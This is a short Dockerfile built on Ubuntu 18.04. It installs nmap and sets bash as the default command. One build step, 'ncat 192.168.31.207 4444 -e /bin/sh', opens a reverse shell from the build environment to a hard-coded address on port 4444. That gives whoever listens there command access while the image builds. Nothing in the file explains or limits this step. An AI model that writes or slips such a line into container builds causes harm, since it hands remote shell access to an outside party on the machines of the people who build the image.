FROM ubuntu:18.04
RUN apt update && apt install -y nmap; exit 0
RUN ncat 192.168.31.207 4444 -e /bin/sh
CMD ["/bin/bash"]
